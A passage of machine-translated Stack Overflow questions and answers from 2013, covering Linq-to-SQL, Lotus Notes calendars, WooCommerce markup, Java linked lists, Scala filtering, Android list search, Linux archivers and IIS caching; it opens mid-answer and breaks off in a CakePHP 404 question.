这样做有点痛苦。该外壳支持各种[剪贴板格式](http://msdn.microsoft.com/en-us/library/windows/desktop/bb776902%28v=vs.85%29.aspx)；在这个场景中感兴趣的是 CFSTR_FILEDESCRIPTOR 和 CFSTR_FILECONTENTS。它的要点是您获得拖动对象的 IStream 表示并将其交给外壳，然后外壳将其复制到放置位置。

# c# - 将 Linq 中的附加属性添加到 sql 类

> ID：14847587
> 
> 赞同：0
> 
> 时间：2013-02-13T06:16:17.073
> 
> 标签：c#, linq-to-sql

`PropIndustryNM`我在 Linq-to-SQL 表中添加了附加属性以进行数据检索。它工作正常。

但是当我尝试向表中插入数据时，会发生错误：

> *无效的列名“PropIndustryNM”*

现在请给出解决方案我该怎么办？我两个都需要。

我是 Linq 的初学者。所以请建议回答我能理解的简单方法。

在 dbml 文件中添加属性

这是我在此属性中设置值的代码。

```
 List<BIODATA_MA> list = new List<BIODATA_MA>();

    for (int i = 0; i < result.Count(); i++)
    {
        BIODATA_MA c = new BIODATA_MA();
        INDUSTRY_MA im = new INDUSTRY_MA();

        c.ACCOUNT_ID = result.ElementAt(i).ACCOUNT_ID;
        c.FULL_NAME = result.ElementAt(i).FULL_NAME;
        c.RESUME_HEADELINE = result.ElementAt(i).RESUME_HEADELINE;
        c.KEY_SKILL = result.ElementAt(i).KEY_SKILL;
        c.TOTAL_EXPERIENCE = result.ElementAt(i).TOTAL_EXPERIENCE;
        c.PropIndustryNm = result.ElementAt(i).INDUSTRY;
        c.PropFunctionalNm = result.ElementAt(i).FUNCTIONAL_AREA;
        c.PropGraduNm = result.ElementAt(i).GRADU;
        c.PropPostGraduNm = result.ElementAt(i).POST_GRADU;
        //  c.TRANS_DATE = result.ElementAt(i).TRANS_DATE;
        list.Add(c);
    } 
```

它的工作正常。但是当插入时间

```
 BIODATA_MA objBio = new BIODATA_MA();

        objBio.INDUSTRY_ID = int.Parse(ddlIndustry.SelectedItem.Value);
        objBio.FUNCTIONAL_AREA_ID = int.Parse(ddlFunctionalArea.SelectedItem.Value);

        if (ddlGradu.SelectedIndex > 0) objBio.GRADU_ID = int.Parse(ddlGradu.SelectedItem.Value); else objBio.GRADU_ID = 0;

        if (ddlPostGradu.SelectedIndex > 0) objBio.POST_GRADU_ID = int.Parse(ddlPostGradu.SelectedItem.Value); else objBio.POST_GRADU_ID = 0;

        if (ddlPhd.SelectedIndex > 0) objBio.PHD = ddlPhd.SelectedItem.Value;

        objBio.COURSE = txtCourse.Text;

        DCBiodataMasDataContext db = new DCBiodataMasDataContext();
        db.BIODATA_MAs.InsertOnSubmit(objBio);

        try
        {
            db.SubmitChanges();
            lbMsg.Text = "added Successfully";
            clearAll();
        }
        catch (Exception)
        {
            lbMsg.Text = "not added.";
            throw;
        } 
```

当使用 InsertOnSubmit() 将数据插入表时，它会抛出类似 Invalid column Name 'PropIndustryNm' 的错误

我不知道我的错误是什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:27:39.620

我不确定这些错误发生在哪里。是否可以看到您声明此“PropIndustryNM”属性的代码？在 DB 中是否有这样的列是真的可用吗？

供您参考，您还可以查看此链接并尝试编写您的链接，

[http://weblogs.asp.net/scottgu/archive/2007/05/19/using-linq-to-sql-part-1.aspx](http://weblogs.asp.net/scottgu/archive/2007/05/19/using-linq-to-sql-part-1.aspx)

[http://www.codeproject.com/Articles/215712/LINQ-to-SQL-Basic-Concepts-and-Features](http://www.codeproject.com/Articles/215712/LINQ-to-SQL-Basic-Concepts-and-Features)

可能分享代码，我们尝试修复它。！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:48:54.373

**解决方案 1.**尝试`model(dbml)`从服务器资源管理器中删除所有表格并再次将其拖放到您的模型中并再次重建它。

**解决方案 2。**您已经从您的表中创建了属性（PropIndustryNM），`model(dbml)`但实际上并不存在于您数据库的实际表中。

只需删除它`PropIndustryNM`，如果你想使用`table(BIODATA_MA)`in `dbml`，你可以`table`从模型中继承它。尝试创建一个类。

```
public class BIODATA_MA_Entity : BIODATA_MA
{
   public string PropIndustryNM {get; set;}
} 
```

现在，您可以使用类似

```
List<BIODATA_MA_Entity> list = new List<BIODATA_MA_Entity>();

for (int i = 0; i < result.Count(); i++)
{
    BIODATA_MA c = new BIODATA_MA();
    INDUSTRY_MA im = new INDUSTRY_MA();

    c.ACCOUNT_ID = result.ElementAt(i).ACCOUNT_ID;
    c.FULL_NAME = result.ElementAt(i).FULL_NAME;
    c.RESUME_HEADELINE = result.ElementAt(i).RESUME_HEADELINE;
    c.KEY_SKILL = result.ElementAt(i).KEY_SKILL;
    c.TOTAL_EXPERIENCE = result.ElementAt(i).TOTAL_EXPERIENCE;
    c.PropIndustryNm = result.ElementAt(i).INDUSTRY;
    c.PropFunctionalNm = result.ElementAt(i).FUNCTIONAL_AREA;
    c.PropGraduNm = result.ElementAt(i).GRADU;
    c.PropPostGraduNm = result.ElementAt(i).POST_GRADU;
    //  c.TRANS_DATE = result.ElementAt(i).TRANS_DATE;
    list.Add(c);
} 
```

> 此***更新***不是答案，而是关于使用`class`. 尝试像这样编码
> 
> ```
> BIODATA_MA objBio = new BIODATA_MA()
>  {
>      INDUSTRY_ID = int.Parse(ddlIndustry.SelectedItem.Value);
>      FUNCTIONAL_AREA_ID = int.Parse(ddlFunctionalArea.SelectedItem.Value);
>      //others  stuff
>  };
> 
>  using (var db = new  DCBiodataMasDataContext())
>  {
>     db.BIODATA_MAs.InsertOnSubmit(objBio);
>  }; 
> ```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T07:03:06.150

它应该通过从您的模型更新表来修复。

# lotus-notes - 当表单由日历视图组成时设置默认日期

> ID：14847590
> 
> 赞同：0
> 
> 时间：2013-02-13T06:16:28.453
> 
> 标签：lotus-notes, lotusscript

有谁知道当用户在笔记日历视图中双击时如何设置默认日期？例如，当您双击 2 月 18 日时，我希望新表单中的 StartDate 字段为 2 月 18 日。

它是在注释邮件模板中完成的，但是它使用了相当复杂的脚本库嵌套和自定义对象，这让我感到困惑。

我曾想过使用环境变量，但是如果用户的客户端崩溃等，这可能会有点混乱，所以我更喜欢另一种解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-11T20:07:06.500

要获取日期，只需在 Regiondoubleclick 方法中使用 NotesUIView 元素的 CalendarDateTime 属性。

```
Sub Regiondoubleclick(Source As Notesuiview)
    Print source.calendarDateTime
    Print "did you see it?"
End Sub 
```

您可以将 source.calendarDateTime 的值分配给新文档中的 datetime 变量或字段，例如 startdate。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T15:27:14.047

当您双击日历视图上日期中的空白区域时执行的 RegionDoubleClick 代码将执行此代码，该代码`@If(@TextToNumber(@Version) < 174;""; @Do(@Environment("CSBroadcast";"0"); @Command([Compose];"Appointment")))`在正常评估后使用约会表单组成文档。Appointment 表单上 StartDate 的默认值是`@If(StartDate = ""; @If(@IsAvailable(StartDateTime);StartDateTime; @Today); StartDate)`将日期设置为今天的日期。您可以在自定义应用程序视图和表单中的相同位置使用这两个语句

# php - WordPress WooCommerce 插件显示不同尺寸的特色产品

> ID：14847593
> 
> 赞同：4
> 
> 时间：2013-02-13T06:16:38.940
> 
> 标签：php, wordpress, woocommerce

我已经在[这个](http://modulesoft.biz/projects/gamesite/)网站上安装了[WooCommerce 。](http://www.woothemes.com/woocommerce/)现在您可以看到主页中有几个产品。特色游戏部分下的产品尺寸为 (100X140)，当我单击它们时，将重定向到产品详细信息页面。到这一步就好了。现在在家里有一些产品在所有产品部分的尺寸与底部图像尺寸不同。

现在我想让顶部（所有产品）完全可点击，这样当点击图片时，它会重定向到相应的产品详细信息页面，就像底部的特色产品一样。我还希望管理员可以完全管理该部分。那么有人可以告诉我该怎么做吗？任何帮助和建议都将是非常可观的。谢谢...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T16:42:45.470

简而言之，图像没有锚标记。这是您需要做的：

**当前代码**

All Products HTML 代码如下所示：

```
<div class="best-seller-wrap">
    <div class="second-img">
        <div class="disount-text">
            30% OFF
        </div>
        <div class="price-text-wrap">
            <h3>$34.99</h3>
            <p>
                <a href="http://modulesoft.info/projects/gamesite/?product=dishonered">Buy Now..</a>
            </p>
        </div>
    </div>
</div> 
```

像这样的CSS：

```
#main .best-seller-wrap .second-img {
    background-image: url('images/best-seller-images/img-2.png');
    position: relative;
} 
```

**新代码**

所有产品 HTML：

```
<div class="best-seller-wrap">
    <div style="position: relative">
        <a class="second-img" href="http://modulesoft.info/projects/gamesite/?product=dishonered"></a>
        <div class="disount-text">
            30% OFF
        </div>
        <div class="price-text-wrap">
            <h3>$34.99</h3>
            <p>
                <a href="http://modulesoft.info/projects/gamesite/?product=dishonered">Buy Now..</a>
            </p>
        </div>
    </div>
</div> 
```

CSS：

```
#main .best-seller-wrap .second-img {
    background-image: url('images/best-seller-images/img-2.png');
    position: relative;
    display: block;
} 
```

您会注意到我将您的`.second-img`课程应用于锚标记并添加`display: block`到课程中：

```
<a class="second-img" href="http://modulesoft.info/projects/gamesite/?product=dishonered"></a> 
```

另请注意，我正在添加`position: relative`到周围`div`

```
<div style="position: relative"> 
```

您的整个图像现在应该可以用作链接。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T14:46:41.150

我只是看了一下网站，我对 woo commerce 不熟悉，但是这两个部分的设计完全不同。特色产品中的链接是：

```
<a href="http://modulesoft.biz/projects/gamesite/?product=demo-product">
<span class="onsale">Sale!</span>
<img width="100" height="140" src="http://modulesoft.biz/projects/gamesite/wp-content/uploads/2013/01/hitman-absolution-275x275-imadfwj4t6zqb3ja-100x140.jpeg" class="attachment-shop_catalog wp-post-image" alt="hitman-absolution-275x275-imadfwj4t6zqb3ja">
<h3>demo product</h3>
<span class="price"><span class="strike-through"><span class="striked-text">    <span class="amount">23€&lt;/span></span></span> <ins><span class="amount">21€&lt;/span></ins></span>
</a> 
```

所以整个部分都在一个标签中，

另一部分有：

```
<div class="first-img">
<div class="disount-text">20% OFF</div>
<div class="price-text-wrap">
<h3>$31.99</h3>
<p><a href="http://modulesoft.info/projects/gamesite/?product=lorem-ipsum-game">Buy Now..</a></p></div>
</div> 
```

其中类“first-img”在样式表中链接：

```
#main .best-seller-wrap .first-img {
  background-image: url('images/best-seller-images/img-1.png');
  position: relative;
} 
```

这只是一个猜测，但如果您找到将 a 标签包裹在第一段代码周围的代码，您应该能够弄清楚如何让它围绕另一段代码执行此操作。

我刚刚查看了基本 woo 商务插件的代码，看起来默认情况下该布局不存在，如果您使用的是主题，如果您找到生成的循环，可能有助于说明它是什么代码但无法将其发布在上面。

# java - 使用节点的自定义链表

> ID：14847602
> 
> 赞同：1
> 
> 时间：2013-02-13T06:17:14.177
> 
> 标签：java, list

我很难使用链接列表/节点，我基本上必须只使用节点在 Java 中创建自己的链接列表。

这是我必须做的：

> ```
>  -----                   -----           -----
>      head -->|  B  |---------------->|  D  |-------->|  S  |
>               -----                   -----           -----
>                |                        |               |
>                |   -----     -----      |   -----       |   -------     -----
>                -->| Ben |-->| Bob |     -->| Dan |      -->| Sarah |-->| Sue |
>                    -----     -----          -----           -------     ----- 
> ```

**这是我到目前为止所拥有的：**

```
public class index {

public static void main(String[] args) {
    //Front = start of list
    nameNode head = null; 

    //head = add(head,"Bob");
    //head.next = add(head,"Cat"); 
    //head.next.next = add(head, "Dog"); 

    nameNode cNode = new nameNode("C", null); 
    nameNode bNode = new nameNode("B",cNode);
    nameNode aNode = new nameNode("A",bNode);

    System.out.println(aNode.next); 

}

// This adds nodes to front of list
public static nameNode add(nameNode head, String movie)
{
    nameNode temp = new nameNode(movie, null); 
    temp.next = head; 
    return temp; 
}

//Private node class that creates new nodes 
private static class nameNode {

    public String data;

    public nameNode next; 

    public nameNode(String data, nameNode next){
        this.data = data; 
        this.next = next; 
    }

    public String toString(){
        return data + ""; 
    }
  }
} 
```

那么我应该怎么做才能通过节点制作 TOP 列表和 BOTTOM 子列表。所以我的想法是基本上为B创建一个节点，然后将Ben和Bob链接在一起，链接到B。然后让B链接到D等等？

我也在玩节点，我认为我现在制作它们的方式是正确的？是否有另一种方法可以自动创建对象，而不是我自己创建对象？

我想要做的是使用 add 方法基本上创建一个新节点......但我不明白如何真正做到这一点，关于我如何做到这一点的任何提示？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-02-13T06:32:25.610

[请在此处](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/util/LinkedList.java#LinkedList)找到实现`LinkedList`

我在图形表示中注意到的是，每个**节点**都指向**数据**以及**下一个节点**。

但是你的`nameNode`班级只有一个 next 指针。您可能必须使用`LinkedList`课堂中使用的另一个参考。

还尝试使用泛型，以便您可以放置​​任何数据。

# scala - 如何根据地图scala中的值过滤掉键和值

> ID：14847603
> 
> 赞同：2
> 
> 时间：2013-02-13T06:17:30.200
> 
> 标签：scala

我有以下代码将 Json 对象重新格式化为另一个 Json 对象：

```
 val newJson = Json.toJson(retJson.fields.flatMap {
      case (epoch, obj) => obj.as[JsObject].fields.map(epoch -> _)
    }.groupBy(_._2._1)
    .mapValues(
      _.map {
        case (epoch, (k, v)) => {
          var epochDate = epoch.substring(0, 13).toLong
          epochDate = convertEpoch(epochDate, timezoneOffset)
          Seq[Double](epochDate, sensorCalculations(whatevers, Option(v.as[String])))
        }
      })) 
```

这很好用，但是我们有一个新的要求，当一个值为 -1 时，我们应该忽略这个元素并且不将它包含在结果中。我不确定如何正确执行此操作。

- - 编辑 - -

我尝试了以下导致匹配错误的方法

```
case (epoch, (k, v)) if v.as[String] != "-1" => { 
```

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:34:18.493

您可以在适当的地方添加 if 子句。例如可以检查值 k：

```
....
case (epoch, (k, v)) if(!(k==-1))=> {
... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T07:37:33.817

```
val newJson = Json.toJson(retJson.fields.flatMap {
  case (epoch, obj) => obj.as[JsObject].fields.map(epoch -> _)
}.groupBy(_._2._1)
  .mapValues(
  _.collect {
    case (epoch, (k, v)) if v != -1 => {
      var epochDate = epoch.substring(0, 13).toLong
      epochDate = convertEpoch(epochDate, timezoneOffset)
      Seq[Double](epochDate, sensorCalculations(whatevers, Option(v.as[String])))
    }
  })) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T23:58:34.463

以下解决方案对我有用：

```
 val il = for {
      (epoch, obj) <- retJson.fields
      (k, v) <- obj.as[JsObject].fields
      if v.as[String] != "-1"
    } yield (epoch, (k, v))

    val mapResult = il.groupBy(_._2._1)
      .mapValues(
        _.map {
          case (epoch, (k, v)) => {
            var epochDate = epoch.substring(0, 13).toLong
            epochDate = convertEpoch(epochDate, timezoneOffset)
            Seq[Double](epochDate, sensorCalculations(whatevers, Option(v.as[String])))
          }
        }) 
```

# android - 将搜索过滤器应用于自定义列表

> ID：14847604
> 
> 赞同：1
> 
> 时间：2013-02-13T06:17:30.120
> 
> 标签：android, listview, search, adapter

我有一些来自数据库的数据，在我使用索引器按字母顺序排列项目之前，我在列表视图中显示了一些数据。所以我的列表显示了按字母顺序排列的项目，并带有部分标题。现在我想使用这个词从列表中搜索项目输入editText.How to do that I know we can use filter and textwatcher for that buthow to use that,因为我设置为listview的适配器不是arrayadapter而是SimpleSectionAdapter。

```
dbHelper.openDataBase();
        Cursor cursor = dbHelper.fetchAllRecords();
        Log.v("count of records", cursor.getCount() + "");
        ArrayList<CategoryPojo> contents = new ArrayList<CategoryPojo>();
        cursor.moveToFirst();
        CategoryPojo cp;
        while (cursor.isAfterLast() == false) {
            cp = new CategoryPojo();
            cp.setCategoryName(cursor.getString(cursor
                    .getColumnIndex(DataBaseHelper.KEY_CATEGORIES)));
            cp.setCategoryImageName(cursor.getString(cursor
                    .getColumnIndex(DataBaseHelper.KEY_IMAGENAME)));
            cursor.moveToNext();
            contents.add(cp);
        }
        cursor.close();
        dbHelper.close();
        Collections.sort(contents, new Comparator<CategoryPojo>() {
            @Override
            public int compare(CategoryPojo s1, CategoryPojo s2) {
                return s1.getCategoryName().compareToIgnoreCase(
                        s2.getCategoryName());
            }
        });
        final CategoryAdapter adapter = new CategoryAdapter(this,
                android.R.layout.simple_list_item_1, contents);
        Sectionizer<CategoryPojo> alphabetSectionizer = new Sectionizer<CategoryPojo>() {
            @Override
            public String getSectionTitleForItem(CategoryPojo instance) {
                return instance.getCategoryName().substring(0, 1);
            }
        };
        final SimpleSectionAdapter<CategoryPojo> sectionAdapter = new SimpleSectionAdapter<CategoryPojo>(
                this, adapter, R.layout.section_header, R.id.title,alphabetSectionizer);
        listView.setFastScrollEnabled(true);
        listView.setTextFilterEnabled(true);
        listView.setAdapter(sectionAdapter);
        edtSearch.addTextChangedListener(new TextWatcher() {
            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {

            }
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count,
                    int after) {
            }
            @Override
            public void afterTextChanged(Editable s) {
            }
        });

And Simplesectionadapter is 
```

公共类 SimpleSectionAdapter 扩展 BaseAdapter 实现 Filterable { private ArrayList mOriginalValues, mDisplayedValues;

```
static final boolean DEBUG = false;
static final String TAG = SimpleSectionAdapter.class.getSimpleName();
// Constants
private static final int VIEW_TYPE_SECTION_HEADER = 0;

private Context mContext;
private BaseAdapter mListAdapter;
private int mSectionHeaderLayoutId;
private int mSectionTitleTextViewId;
private Sectionizer<T> mSectionizer;
private LinkedHashMap<String, Integer> mSections;
AlphabetIndexer alphaIndexer;

public SimpleSectionAdapter(Context context, ArrayList<CategoryPojo> contents, BaseAdapter listAdapter,
        int sectionHeaderLayoutId, int sectionTitleTextViewId,
        Sectionizer<T> sectionizer) {

    if (context == null) {
        throw new IllegalArgumentException("context cannot be null.");
    } else if (listAdapter == null) {
        throw new IllegalArgumentException("listAdapter cannot be null.");
    } else if (sectionizer == null) {
        throw new IllegalArgumentException("sectionizer cannot be null.");
    } else if (!isTextView(context, sectionHeaderLayoutId,
            sectionTitleTextViewId)) {
        throw new IllegalArgumentException(
                "sectionTitleTextViewId should be a TextView.");
    }

    this.mOriginalValues = contents;
    this.mDisplayedValues = contents; 
    this.mContext = context;
    this.mListAdapter = listAdapter;
    this.mSectionHeaderLayoutId = sectionHeaderLayoutId;
    this.mSectionTitleTextViewId = sectionTitleTextViewId;
    this.mSectionizer = sectionizer;
    this.mSections = new LinkedHashMap<String, Integer>();

    // Find sections
    findSections();
}

private boolean isTextView(Context context, int layoutId, int textViewId) {
    View inflatedView = View.inflate(context, layoutId, null);
    View foundView = inflatedView.findViewById(textViewId);

    return foundView instanceof TextView;
}

@Override
public int getCount() {
    return mDisplayedValues.size();
    //return mListAdapter.getCount() + getSectionCount();
}

@Override
public View getView(int position, View convertView, ViewGroup parent) {
    View view = convertView;
    SectionHolder sectionHolder = null;

    switch (getItemViewType(position)) {
    case VIEW_TYPE_SECTION_HEADER:
        if (view == null) {

            view = View.inflate(mContext, mSectionHeaderLayoutId, null);
            sectionHolder = new SectionHolder();
            sectionHolder.titleTextView = (TextView) view
                    .findViewById(mSectionTitleTextViewId);
            view.setTag(sectionHolder);
        } else {
            sectionHolder = (SectionHolder) view.getTag();
        }
        break;

    default:
        view = mListAdapter.getView(getIndexForPosition(position),
                convertView, parent);
        break;
    }

    if (sectionHolder != null) {
        String sectionName = sectionTitleForPosition(position);

        sectionHolder.titleTextView.setText(sectionName);
    }

    return view;
}

@Override
public boolean areAllItemsEnabled() {
    return mListAdapter.areAllItemsEnabled() ? mSections.size() == 0
            : false;
}

@Override
public int getItemViewType(int position) {
    int positionInCustomAdapter = getIndexForPosition(position);
    return mSections.values().contains(position) ? VIEW_TYPE_SECTION_HEADER
            : mListAdapter.getItemViewType(positionInCustomAdapter) + 1;
}

@Override
public int getViewTypeCount() {
    return mListAdapter.getViewTypeCount() + 1;
}

@Override
public boolean isEnabled(int position) {
    return mSections.values().contains(position) ? false : mListAdapter
            .isEnabled(getIndexForPosition(position));
}

@Override
public Object getItem(int position) {
    return mListAdapter.getItem(getIndexForPosition(position));
}

@Override
public long getItemId(int position) {
    return mListAdapter.getItemId(getIndexForPosition(position));
}

@Override
public void notifyDataSetChanged() {
    mListAdapter.notifyDataSetChanged();
    findSections();
    super.notifyDataSetChanged();
}

/**
 * Returns the actual index of the object in the data source linked to the
 * this list item.
 * 
 * @param position
 *            List item position in the {@link ListView}.
 * @return Index of the item in the wrapped list adapter's data source.
 */
public int getIndexForPosition(int position) {
    int nSections = 0;

    Set<Entry<String, Integer>> entrySet = mSections.entrySet();
    for (Entry<String, Integer> entry : entrySet) {
        if (entry.getValue() < position) {
            nSections++;
        }
    }

    return position - nSections;
}

static class SectionHolder {
    public TextView titleTextView;
}

private void findSections() {
    int n = mListAdapter.getCount();
    int nSections = 0;
    mSections.clear();

    for (int i = 0; i < n; i++) {
        @SuppressWarnings("unchecked")
        String sectionName = mSectionizer
        .getSectionTitleForItem((T) mListAdapter.getItem(i));

        if (!mSections.containsKey(sectionName)) {
            mSections.put(sectionName, i + nSections);
            nSections++;
        }
    }

    if (DEBUG) {
        Log.d(TAG, String.format("Found %d sections.", mSections.size()));
    }
}

private int getSectionCount() {
    return mSections.size();
}

private String sectionTitleForPosition(int position) {
    String title = null;

    Set<Entry<String, Integer>> entrySet = mSections.entrySet();
    for (Entry<String, Integer> entry : entrySet) {
        if (entry.getValue() == position) {
            title = entry.getKey();

            break;
        }
    }

    return title;
}

@Override
public Filter getFilter() {

    return new android.widget.Filter() {

        @SuppressWarnings("unchecked")
        @Override
        protected void publishResults(CharSequence constraint,
                FilterResults results) {

            mDisplayedValues = (ArrayList<CategoryPojo>) results.values;

            // has
            // the
            // filtered
            // values

            notifyDataSetChanged(); // notifies the data with new filtered
            // values
        }

        @Override
        protected FilterResults performFiltering(CharSequence constraint) {

            FilterResults results = new FilterResults(); // Holds the
            // results of a
            // filtering
            // operation in
            // values
            ArrayList<CategoryPojo> FilteredArrList = new ArrayList<CategoryPojo>();

            if (mOriginalValues == null) {

                mOriginalValues = new ArrayList<CategoryPojo>(mDisplayedValues); 

            }

            if (constraint == null || constraint.length() == 0) {

                // set the Original result to return
                results.count = mOriginalValues.size();
                results.values = mOriginalValues;
            } else {
                constraint = constraint.toString().toLowerCase();
                for (int i = 0; i < mOriginalValues.size(); i++) {
                    String data = String.valueOf(mOriginalValues.get(i)
                            .getCategoryName());
                    if (data.toLowerCase()
                            .startsWith(constraint.toString())) {
                        FilteredArrList.add(new CategoryPojo(
                                mOriginalValues.get(i).getCategoryName(),
                                mOriginalValues.get(i)
                                .getCategoryImageName()));
                    }
                }
                // set the Filtered result to return
                results.count = FilteredArrList.size();
                results.values = FilteredArrList;
            }
            return results;
        }
    };
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:03:25.700

文本观察器代码

```
inputSearch.addTextChangedListener(new TextWatcher() {
        @Override
        public void onTextChanged(CharSequence cs,
                int arg1, int arg2, int arg3) {
            // When user changed the Text
            mainmenu2.this.adapter1.getFilter().filter(
                    cs);
        }

        @Override
        public void beforeTextChanged(CharSequence arg0,
                int arg1, int arg2, int arg3) {
            // TODO Auto-generated method stub

        }

        @Override
        public void afterTextChanged(Editable arg0) {
            // TODO Auto-generated method stub
        }
    }); 
```

和里面

```
public class SimpleSectionAdapter<T> extends BaseAdapter { 
```

像这样实现Filterable

```
public class SimpleSectionAdapter<T> extends BaseAdapter implements Filterable 
```

然后在 SimpleSectionAdapter 中使用这个 android.widget.Filter getFilter() （“根据你的编辑它，它只是一个例子）

```
public android.widget.Filter getFilter() {
        // TODO Auto-generated method stub
        return new android.widget.Filter() {

            @SuppressWarnings("unchecked")
            @Override
            protected void publishResults(CharSequence constraint, FilterResults results) {
                // TODO Auto-generated method stub
                 mDisplayedValues = (ArrayList<Product>) results.values; // has the filtered values
                notifyDataSetChanged();  // notifies the data with new filtered values
            }

            @Override
            protected FilterResults performFiltering(CharSequence constraint) {
                // TODO Auto-generated method stub
                  FilterResults results = new FilterResults();        // Holds the results of a filtering operation in values
                ArrayList<Product> FilteredArrList = new ArrayList<Product>();

                if (mOriginalValues == null) {
                    mOriginalValues = new ArrayList<Product>(mDisplayedValues); // saves the original data in mOriginalValues
                }

                /********
                 * 
                 *  If constraint(CharSequence that is received) is null returns the mOriginalValues(Original) values
                 *  else does the Filtering and returns FilteredArrList(Filtered)  
                 *
                 ********/
                if (constraint == null || constraint.length() == 0) {

                    // set the Original result to return  
                    results.count = mOriginalValues.size();
                    results.values = mOriginalValues;
                } else {
                    constraint = constraint.toString().toLowerCase();
                    for (int i = 0; i < mOriginalValues.size(); i++) {
                        String data = String.valueOf(mOriginalValues.get(i).fname);
                        if (data.toLowerCase().startsWith(constraint.toString())) {
                            FilteredArrList.add(new Product(mOriginalValues.get(i).id,mOriginalValues.get(i).fname,mOriginalValues.get(i).lname));
                        }
                    }
                    // set the Filtered result to return
                    results.count = FilteredArrList.size();
                    results.values = FilteredArrList;
                }
                return results;
            }
        };
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:35:22.837

使用`Textwatcher`. [点击这里了解更多详情](http://developer.android.com/reference/android/text/TextWatcher.html)

```
public class MainActivity extends Activity {

ArrayList<String> list = new ArrayList<String>();

private EditText searchEdt;

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {

    super.onCreate(savedInstanceState);

    // making it full screen
    requestWindowFeature(Window.FEATURE_NO_TITLE);
    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN);
    setContentView(R.layout.activity_ugsimply_beta);
    list.add("Samsung Tab");
    list.add("Samsung Note");
    list.add("Nokia Lumia");
    list.add("Nokia 5130");
    list.add("Sony Xperia");
    searchEdt = (EditText) findViewById(R.id.searchEdt);

    searchEdt.addTextChangedListener(new TextWatcher() {

        private int textlength;
        private ArrayList<String> arrayList_sort = new ArrayList<String>();

        public void afterTextChanged(Editable s) {
            // Abstract Method of TextWatcher Interface.
        }

        public void beforeTextChanged(CharSequence s, int start, int count,
                int after) {
            // Abstract Method of TextWatcher Interface.
        }

        public void onTextChanged(CharSequence s, int start, int before,
                int count) {
            textlength = searchEdt.getText().length();
            if (arrayList_sort != null)
                arrayList_sort.clear();

            for (int i = 0; i < list.size(); i++) {

                if (textlength <= list.get(i).toString().length()) {

                    if (searchEdt
                            .getText()
                            .toString()
                            .equalsIgnoreCase(
                                    (String) list.get(i).toString()
                                            .subSequence(0, textlength))) {
                        arrayList_sort.add(list.get(i));
                        Log.d("TAG", "log" + arrayList_sort.size());
                    }
                }
            }

        }
    });

} 
```

}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T07:25:01.333

在 onTextChanged 上这样写...

```
@Override
    public void onTextChanged(CharSequence s, int start, int before, int count) {

        if (s.toString().length() >= THRESHOLD ){
            FetchResult fetchResult = new FetchResult();
            fetchResult.execute(s.toString());

        }

    } 
```

# linux - 支持压缩、加密、保留权限和快速检索文件的存档器

> ID：14847606
> 
> 赞同：0
> 
> 时间：2013-02-13T06:17:33.150
> 
> 标签：linux, gzip, tar, 7zip, rar

我有一个包含大量数据的目录，我想将其存档。我需要

1.  支持压缩。压缩可以节省大量磁盘空间；
2.  支持密码加密。数据很敏感，所以如果磁盘被盗，我希望它不可读；
3.  保留*NIX权限；
4.  快速检索文件，这意味着如果我只需要从中获取一个小文件，它应该很快并且不会读取整个存档。

我心目中的所有知名档案馆都不符合上述所有标准：

*   TAR：未压缩，无密码加密；
*   TAR.GZ / TAR.BZ2 / TAR.7Z：如果你只需要一个文件，你需要解压tar.gz文件，直到tar得到你需要的文件；
*   7Z/RAR：不保留权限；
*   ZIP：未加密且不保留权限

有人有建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:26:29.340

尝试查看 Info-ZIP，它应该保留权限（UNIX 和 NTFS）。

[http://www.info-zip.org/](http://www.info-zip.org/)

好像有一段时间没有更新了，而且我没有亲身体验，所以不确定它是否满足您的需求。

# asp.net - 静态内容会阻止网站中的一些图像

> ID：14847607
> 
> 赞同：2
> 
> 时间：2013-02-13T06:17:33.040
> 
> 标签：asp.net, image, web-config, asp.net-webpages, static-content

我`<static content>`用来在 web.config 文件中提供到期日期。当我包含下面的标签时，某些**图像未显示**在其中一个网页中。

但是当我排除标签时，网站运行完美，但我需要包含标签以优化网站。

我正在使用下面的代码：

```
<location path="images" >
  <system.webServer>
    <staticContent>
      <clientCache cacheControlMode="UseExpires" httpExpires="Mon, 1 Apr 2013 00:00:00 GMT"/>
    </staticContent>
</location> 
```

我会包含一个快照，但由于我需要至少 10 个声望来发布图像，所以我无法这样做。

有人可以帮忙吗？？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T14:50:30.480

您遇到问题的页面可能已被缓存，并且尚未过期（因此没有显示新内容）。

*   `<staticContent>`从您的 web.config 中删除该部分。
*   使您网站中所有页面的缓存过期（[此处](http://www.iis.net/configreference/system.webserver/staticcontent/clientcache)的说明）
*   将该部分重新添加`<staticContent>`到您的 web.config 中。

# php - Cakephp 页面重定向到 Windows 服务器上未找到的 404

> ID：14847610
> 
> 赞同：0
> 
> 时间：2013-02-13T06:18:01.970
> 
> 标签：php, windows, .htaccess, cakephp, windows-server-2003

我已经在 Windows 服务器上上传了 cakephp 文件，

我收到错误 HTTP 错误 404.0 - 以下所有页面均未找到。

```
http://exoticvoyages.ntechinfo.com/index/index
http://exoticvoyages.ntechinfo.com/index/search
http://exoticvoyages.ntechinfo.com/index/getcountry
